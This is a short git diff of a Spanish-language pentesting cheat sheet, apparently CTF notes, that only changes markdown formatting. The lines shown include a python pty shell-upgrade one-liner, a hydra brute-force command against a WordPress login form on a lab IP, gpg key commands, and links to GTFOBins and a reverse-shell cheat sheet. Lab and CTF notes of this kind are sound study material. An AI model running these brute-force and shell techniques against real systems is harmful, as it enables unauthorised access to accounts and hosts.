@@ -30,9 +30,9 @@ https://gtfobins.github.io/#
 https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/
 
 ## Técnicas varias 🔧
-_Abrir terminal con python: python -c 'import pty;pty.spawn("/bin/bash")'
-_Uso de hydra: hydra -L fsocity.dic -p test 10.10.192.186 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.192.186%2Fwp-admin%2F&testcookie=1:F=Invalid username' otra opción final: /S=302
-_Encriptar gpg:
+_Abrir terminal con python:_ python -c 'import pty;pty.spawn("/bin/bash")'
+_Uso de hydra:_ hydra -L fsocity.dic -p test 10.10.192.186 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.192.186%2Fwp-admin%2F&testcookie=1:F=Invalid username' otra opción final: /S=302
+_Encriptar gpg:_
 ```
 gpg --list-keys --> listar claves
 gpg --import /var/backup/root@harder.local.pub --> importar claves
